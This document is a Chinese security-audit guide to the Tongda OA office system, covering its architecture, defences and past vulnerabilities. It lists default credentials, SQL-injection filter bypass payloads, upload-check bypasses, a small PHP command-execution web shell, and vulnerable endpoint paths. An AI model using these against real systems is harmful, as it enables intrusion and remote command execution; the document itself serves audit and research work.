# 通达OA

## 环境配置

### 下载安装

v12版：https://cdndown.tongda2000.com/oa/2022/TDOA12.0.exe

v11版（11.2-11.10）：TDOA+版本名.exe。比如下载11.9本，则名为`TDOA11.9.exe`，对应的下载链接为：https://cdndown.tongda2000.com/oa/2019/TDOA11.10.exe

2013-2017版：旧版本，MYOA+年份.exe。比如下载2015版本，则名为`/oa/2015/MYOA2015.exe`，对应的下载链接为：https://cdndown.tongda2000.com/oa/2017/MYOA2017.exe

环境安装为一体安装包，直接双击点exe，设定完安装目录安装（例如C:\TongDa）即可自动安装。源码在web根目录（webroot）。代码同样是使用php Zend 5.x进行加密的，所以可以使用SeayDzend工具或者百度php zend解密在线网站进行解密。

版本查询
```
inc/expired.php
inc/version.inc.php
inc/reg_trial.php
inc/reg_trial_submit.php
```

### 账户密码 
```
# 后台账户
admin 密码默认为空 (不会强制修改密码；密码限制长度8-20位，必须同时包含字母和数字)

# 扩展用户
officeTask 默认密码为空

# 服务账户
查看\bin\Service.ini文件

# 默认超级密码
v11版: 空
2013-2017版: t.KNnZ13xCrRI
```


### 补丁

补丁分为日常离线补丁包和紧急补丁包，后者在出了新版本之后不再上架。下载链接如下。XXX为各系列、版本发布年份。例如v11系列最早发布于2019年，即修改为patch2019.php或p2019patch.php。紧急补丁和离线补丁包的区别在于：打了紧急补丁的系统，版本号不会改变，且只存在于每个大版本之间。

离线补丁包：https://www.tongda2000.com/download/pXXXpatch.php

紧急补丁：https://www.tongda2000.com/download/patchXXX.php

## 架构分析
### 路由特点
通达OA采用了yii2框架，并加入自主开发的系统。安装目录如下，官方文档中声明了`/webroot/general/`是主要功能模块，子文件夹appbuilder就是用的yii框架。但其他功能没有在yii框架范围内。所以路由分为（1）文件到根目录的相对路径 （2）yii框架对应的`/general/appbuilder/web/模块名/控制器名/方法名`
```
｜—attach （存放附件）
｜—bin （PHP、Zeng等配置）
｜—data5 （mysql数据库文件）
｜—logs （日志文件）
｜—MyAdmin （mysql管理工具）
｜—mysql5 （mysql主程序文件）
｜—nginx （Nginx Web应用服务）
｜—tmp （临时文件）
｜—webroot （Web根目录）
    ｜—general 主要模块
        ｜—appbuilder yii框架
        ｜—system 系统功能模块
    ｜—inc 系统通用程序及函数目录
    ｜—ispirit OA精灵页面
    ｜—mobile OA移动界面
    ｜—module 系统组件
    ｜—portal 门户界面
```

查看`/general/appbuilder/config/web.php`，即yii的路由配置。可以看到（1）开启了美化路由，并且设置不显示index.php，但是没设置美化规则
```php
"urlManager"   => array(
	"enablePrettyUrl" => true,
	"showScriptName"  => false,
	"rules"           => array()
	),
```
yii框架的url通过参数r标识请求的module（模块），controller（控制器），action（方法）的部分，如`http://ip/index.php?r=post/view&id=1`，表示请求由`PostController`的`actionView`来处理。而yii的美化路由功能`enablePrettyUrl`设为true时，会将其变为`http://ip/index.php/post/view/1`。`showScriptName`设为false则会在此基础上隐藏index.php，即`http://ip/post/view/1`。结合通达yii框架入口文件index.php所在位置`/general/appbuilder/web/index.php`，通达yii框架的访问路由即为`/general/appbuilder/web/module/controller/action`。

   
**未授权模块筛选**
`/general/appbuilder/config/params.php`文件中定义了`check_module`和`skip_module`。即需要校验和不需要校验权限的模块。将$b_dir_priv直接设置为true部分可以免登录直接访问。
```php
"check_module"  => array("appcenter", "report", "appdesign"),
"skip_module"   => array("portal", "hr", "meeting", "formCenter", "calendar", "officeproduct", "invoice"),
```
另外，可以查找不包含权限校验文件的（如下），优先进行代码审计
```
pda/auth.php
pda/pad/auth.php
task/auth.php
mobile/auth_mobi.php
mobile/auth.php
general/data_center/utils/task_auth.php
general/reportshop/utils/task_auth.php
interface/auth.php
ispirit/im/auth.php
```

### 安全策略

#### (1) sql注入防护

引用的80sec的sql注入通用ids防御程序，位于`/inc/conn.php`的`sql_injection`方法。然后在不同版本中进行了不同程度的修改，展开可以查看11.10版本的。

<details>
	<summary>sql_injection 11.10版本</summary>
	<pre>
	<code>
function sql_injection($db_string)
{
	$clean = "";
	$error = "";
	$old_pos = 0;
	$pos = -1;
	$db_string = str_replace(array("''", "\'"), "", $db_string);
	$db_string = preg_replace("/`[^,=\(\)]*'[^,=\(\)]*`/", "", $db_string);
	while (true) { //绕过思路1:两个单引号之间的内容替换成\$s\$
		$pos = strpos($db_string, "'", $pos + 1);
		if ($pos === false) {
			break;
		}
		$clean .= substr($db_string, $old_pos, $pos - $old_pos);
		while (true) {
			$pos1 = strpos($db_string, "'", $pos + 1);
			$pos2 = strpos($db_string, "\\", $pos + 1);
			if ($pos1 === false) {
				break;
			}
			else {
				if (($pos2 == false) || ($pos1 < $pos2)) {
					$pos = $pos1;
					break;
				}
			}
			$pos = $pos2 + 1;
		}
		$clean .= "\$s\$";
		$old_pos = $pos + 1;
	}
	$clean .= substr($db_string, $old_pos);
	$clean = trim(strtolower(preg_replace(array("/\s+/s"), array(" "), $clean)));
	$fail = false;
	$matches = array();
	if ((2 < strpos($clean, "/*")) || (strpos($clean, "--") !== false) || (strpos($clean, "#") !== false)) {
		$fail = true;
		$error = _("注释代码");
	}
	else if (preg_match("/(^|[^a-z])union(\s+[a-z]*)*\s+select($|[^[a-z])/s", $clean) != 0) {
		$fail = true;
		$error = _("联合查询");
	}
	else if (preg_match("/(^|[^a-z])(sleep|benchmark|load_file|mid|ord|ascii|extractvalue|updatexml|exp|current_user)\s*\(/s", $clean, $matches) != 0) 	   {
		$fail = true;
		$error = $matches[2];
	}
	else if (preg_match("/(^|[^a-z])into\s+outfile($|[^[a-z])/s", $clean) != 0) {
		$fail = true;
		$error = _("生成文件");
	}
	else if (preg_match("/.*update.+user.+set.+file_priv.*/s", $clean) != 0) {
		$fail = true;
		$error = "set file_priv";
	}
	else if (preg_match("/.*set.+general_log.*/s", $clean) != 0) {
		$fail = true;
		$error = "general_log";
	}
	if ($fail) {
		echo _("不安全的SQL语句：") . $error . "<br />";
		echo td_htmlspecialchars($db_string);
		exit();
	}
}
	</code>
	</pre>
</details>

上述防御会将两个单引号之间的内容替换成\$s\$，然后拼接到$clean进行处理，判断clean中是否包含联合注入、注释代码的关键字。所以绕过方式整体分为三种（1）单引号绕过 （2）盲注绕过 （3）编码绕过
```
# 单引号绕过
(1) @+反引号包裹。如@\`'\`，此时该值为null。如果是sql表不允许某个字段为null，规避这个情况需要通过来char(@\`'\`)绕过。11.9以下版本可用
(2) 两个@符号包裹。如 @'@
(3) 双引号包裹。如 "'"
(4) 反引号拼接。如 `'`.``.后续sql语句。以TD_OA数据库user表为例，表结构中字段user_name为中文账户名，user_id为用户名，uid为用户id编号。
如 select * from user where user_name='a' and `'`.``.uid or if(substr((select user_id from user where uid = 1),1,1)='a',sleep(5),0)#';
此sql语句优先级等同： select * from user where user_name='a' and (`'`.``.uid or (if(substr((select user_id from user where uid = 1),1,1)='a',sleep(5),0)))#';

# 盲注绕过
在11.9版本的通达中已经对常见绕过方式进行了修复，首先会把所有转义之后的引号替换为空，然后再把反引号中的引号替换为空（见代码注释）。但是没有处理盲注，其中延时注入可以通过笛卡尔注入方式，逻辑盲注也没有过滤（根据页面情况响应来判断）

# 编码绕过
hex编码和url编码等。如select * from user where id = 1 and (select name from by_user where uid=1) like 0x25
```

#### (2) 文件上传防护

位于`inc/utility_file.php`的`is_uploadable`方法是针对上传文件的检测函数，展开查看11.10版本的代码

<details>
	<summary>is_uploadable 11.10版本</summary>
	<pre>
	<code>
function is_uploadable($FILE_NAME)
{
	$POS = strrpos($FILE_NAME, ".");
	if ($POS === false) {
		$EXT_NAME = $FILE_NAME;
	}
	else {
		if ((strtolower(substr($FILE_NAME, $POS + 1, 3)) == "") || (strtolower(substr($FILE_NAME, $POS + 1, 3)) == "php")) {
			return false;
		}
		$EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));
	}
	if (find_id(MYOA_UPLOAD_FORBIDDEN_TYPE, $EXT_NAME)) { // // $UPLOAD_FORBIDDEN_TYPE = "php,php3,php4,php5,phpt,jsp,asp,aspx,";
		return false;
	}
	if (MYOA_UPLOAD_LIMIT == 0) {
		return true;
	}
	else if (MYOA_UPLOAD_LIMIT == 1) {
		return !find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);
	}
	else if (MYOA_UPLOAD_LIMIT == 2) {
		return find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME); // $UPLOAD_LIMIT_TYPE = "php,php3,php4,php5,";
	}
	else {
		return false;
	}
}
	</code>
	</pre>
</details>

防护对文件名末尾的`.`截取进行检测，只要不是以`.php`、`.php3`等结尾即可绕过。
```
(1) 点绕过。即a.php.
(2) ascii编码绕过。0x88
(3) 包含指定目录的文件（vuln-history sql注入修改文件路径进行包含的漏洞）
```
另外，由于nginx的nginx.conf配置文件设定对上传目录attachment等目录下的文件不具备执行权限，也就是需要目录穿越到其他目录下才能执行php文件
```
location ~* ^/(attachment|static|images|theme|templates|wav|mysql|resque|task)/.*\.(php|.php3|.php5|jsp|asp)$ {
    deny all;
}
```

#### (3) 危险函数限制
通达的php.ini中设置了disable_function，不同版本下的php配置不同，所以disable_function也有一些区别。v11.10限制了大部分危险函数，一句话木马写shell受限，但没限制的可执行函数：`assert`（不能通过这个一句话来执行系统命令）。2015版基本没有限制eval函数
```ini
# 11.10
disable_functions = exec,shell_exec,system,passthru,proc_open,show_source,phpinfo,popen,dl,eval,proc_terminate,touch,escapeshellcmd,escapeshellarg

# 2015 未限制eval
disable_functions = exec,shell_exec,system,passthru,proc_open,show_source,phpinfo
```
绕过方式除了在11.10中用assert、2015中用eval函数这种黑名单绕过方式，还可以 (1) Windows系统组件COM上传图片马 (2) mysql udf提权。Windows系统组件COM上传图片马的条件：a.
`com.allow_dcom = true`（默认不开启） b. 开启`php_com_dotnet.dll` c. php>5.4。利用代码如下，但在11.9版本已经不支持这种方式。mysql udf提权的条件是：a. mysql可远程登录；b.CREATE权限、FILE权限（root用户默认拥有所有权限）；c.  `secure_file_priv`项设置为空（不是null）:

**Windows系统组件COM上传图片马**
```php
<?php
  $command = $_POST['pass'];
  $wsh = new COM('WScript.shell');
  $exec = $wsh->exec("cmd/c".$command);
  $stdout = $exec->StdOut();
  $stroutput = $stdout->ReadAll();
  echo $stroutput;
```

## 历史漏洞


|漏洞名称|访问路径|影响版本|
|:---:|:---:|:---:|
|report_bi.func.php sql联合注入漏洞|`/general/bi_design/appcenter/report_bi.func.php`|<=11.6|
|/recv/register/insert sql盲注漏洞|`/general/document/index.php/recv/register/insert`|<=11.6|
|swfupload_new.php 未授权sql盲注漏洞|`/general/file_folder/swfupload_new.php`|<=11.5|
|get_index_data.php sql盲注漏洞|`/general/email/inbox/get_index_data.php`|<=11.7|
|release.php sql盲注漏洞|`/general/crm/studio/modules/EntityRelease/release.php`|2011-2013|
|delete_cascade.php sql任意注入漏洞|`/general/hrms/manage/hrms.php`|<=11.10|
|go.php sql报错注入漏洞|`interface/go.php`|<=11.7|
|use_finger.php sql报错注入漏洞|`/inc/finger/use_finger.php`|<=2014|
|search_excel.php sql报错注入漏洞|`/general/ems/query/search_excel.php`|<=2014|
|record_detail.php sql延时注入漏洞|`/pda/reportshop/record_detail.php`|<=11.6|
|export_data.php sql延时注入漏洞|`/general/system/approve_center/flow_data/export_data.php`|<=11.10|
|RepdetailController.php sql盲注漏洞|`/general/appbuilder/web/report/repdetail/edit`|<=11.5|
|Calendar.php sql盲注漏洞|`/general/appbuilder/web/calendar/calendarlist/getcallist`|<=11.5|
|WorkbenchController.php sql盲注漏洞|`/general/appbuilder/web/calendar/calendarlist/getcallist`|<=11.9|
|applyprobygroup sql延时注入漏洞|`/general/appbuilder/web/officeproduct/productapply/applyprobygroup`|<=11.7|
|finish sql延时注入漏洞|`/general/document/index.php/send/approve/finish`|2015|
|meetingreceipt sql堆叠注入漏洞|`/general/appbuilder/web/meeting/meetingmanagement/meetingreceipt`|<=11.5|
|upload/upload.php 文件上传漏洞|`module/upload/upload.php`|<=11.3|
|utils/upload.php 文件上传漏洞|`general/reportshop/utils/upload.php?action=upload`|2015|
|netdisk/upload.php 文件上传漏洞|`/general/netdisk/upload.php`|<=11.9|
|api.ali.php 文件上传漏洞|`mobile/api/api.ali.php`|<=11.8|
|staff_info/update.php 文件包含漏洞|`general/hr/manage/staff_info/update.php`|<=11.8|
|down.php 未授权数据库备份文件下载漏洞|`/inc/package/down.php`|<=11.8|
|exportLog.php 未授权文件下载漏洞|`/general/approve_center/archive/exportLog.php`|2017旧版以前|
|get_file.php 未授权文件下载漏洞|`/module/AIP/get_file.php`|2017旧版以前|
|export.php 未授权文件下载漏洞|`general/crm/apps/crm/include/import/export.php`|2011|
|action_upload.php 未授权上传漏洞|`/module/ueditor/php/action_upload.php`|ueditor 1.3.6版本|
|print.php 文件删除漏洞|`/module/appbuilder/assets/print.php`|<=11.6|
|im/upload.php 未授权文件上传漏洞|`ispirit/im/upload.php`|<=11.3|
|im/photo.php 任意文件读取漏洞|`/ispirit/im/photo.php `|<=11.7|
|new/submit.php 文件上传漏洞|`/general/file_folder/new/submit.php `|<=11.7|
|/utils/upload.php 文件上传漏洞|`/general/data_center/utils/upload.php`|<=11.6|
|video_file.php 文件下载漏洞|`/general/mytable/intel_view/video_file.php`|——|
|gateway.php 文件包含漏洞|`/ispirit/interface/gateway.php`|<=11.3|
|swfupload.php 未授权文件上传漏洞|`general/file_folder/swfupload.php`|<=11.5|
|second_tabs.php 文件伪造漏洞|`inc/second_tabs.php`|<=11.3|
|report/getdata.php 文件上传漏洞|`mobile/reportshop/report/getdata.php`|<=11.3|
|auth_mobi.php 在线任意用户登录漏洞|`/mobile/auth_mobi.php`|<=11.7|
|logincheck_code.php 任意登录漏洞|`/general/logincheck_code.php`|<=11.5|
|logincheck.php 爆破漏洞|`login.php/logincheck.php`|<=11.10|
|img_download.php SSRF漏洞|`/pda/workflow/img_download.php`|<=11.7|

